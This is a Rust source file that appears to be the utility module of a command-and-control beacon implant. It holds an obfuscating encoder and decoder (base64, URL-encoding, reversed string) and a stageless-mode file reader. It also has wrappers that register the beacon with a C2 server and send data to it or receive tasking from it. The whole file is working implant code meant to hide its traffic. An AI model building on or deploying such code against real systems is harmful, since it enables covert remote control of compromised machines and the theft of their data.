//! Utility helpers: encoding/decoding, file I/O, and transport wrappers.
//!
//! The `register_beacon`, `send_data`, and `recv_data` functions wrap the
//! raw transport layer with encoding/decoding so that the encoder can be
//! swapped in one place without touching any transport implementation.

use base64::{engine::general_purpose, Engine as _};
#[cfg(feature = "stagless")]
use tokio::fs;

use crate::transports;

// ── Encoding / Decoding ─────────────────────────────────────────────────────
// Change these two functions to swap the encoder globally.

/// Encode raw bytes into a reversible, URL-safe string.
///
/// Pipeline: raw bytes → base64 → URL-encode → reverse string.
pub fn data_encode(data: &[u8]) -> String {
    let b64 = general_purpose::STANDARD.encode(data);
    let quoted = urlencoding::encode(&b64).into_owned();
    quoted.chars().rev().collect()
}

/// Decode a string produced by [`data_encode`] back into raw bytes.
///
/// Pipeline: reverse string → URL-decode → base64-decode.
pub fn data_decode(data: &str) -> Result<Vec<u8>, Box<dyn std::error::Error>> {
    let reversed: String = data.chars().rev().collect();
    let unquoted = urlencoding::decode(&reversed)?;
    let bytes = general_purpose::STANDARD.decode(unquoted.as_bytes())?;
    Ok(bytes)
}

// ── File I/O ────────────────────────────────────────────────────────────────

/// Read the entire contents of a file as raw bytes (used by stagless mode).
#[cfg(feature = "stagless")]
pub async fn read_file(path: &str) -> Result<Vec<u8>, Box<dyn std::error::Error>> {
    let data = fs::read(path)
        .await
        .map_err(|e| format!("Failed to read {}: {}", path, e))?;
    Ok(data)
}

// ── Transport wrappers (encode/decode in one place) ─────────────────────────

/// Register a new beacon with the C2 server via the configured transport.
///
/// This is a thin wrapper around `transports::register_beacon` — registration
/// does not involve encoding, but having it here keeps the API surface in one
/// place.
pub async fn register_beacon(
    beacon_id: &str,
) -> Result<transports::Transport, Box<dyn std::error::Error>> {
    transports::register_beacon(beacon_id).await
}

/// Encode `data` and send it to the C2 server via the configured transport.
pub async fn send_data(
    transport: &transports::Transport,
    data: &[u8],
) -> Result<(), Box<dyn std::error::Error>> {
    let encoded = data_encode(data);
    transports::send_data(transport, encoded.as_bytes()).await
}

/// Receive encoded data from the C2 server, decode each message, and return
/// the decoded payloads.
pub async fn recv_data(
    transport: &transports::Transport,
) -> Result<Vec<Vec<u8>>, Box<dyn std::error::Error>> {
    let raw_messages = transports::recv_data(transport).await?;
    let mut decoded = Vec::with_capacity(raw_messages.len());
    for raw in raw_messages {
        let raw_str = std::str::from_utf8(&raw)?;
        let msg = data_decode(raw_str)?;
        decoded.push(msg);
    }
    Ok(decoded)
}
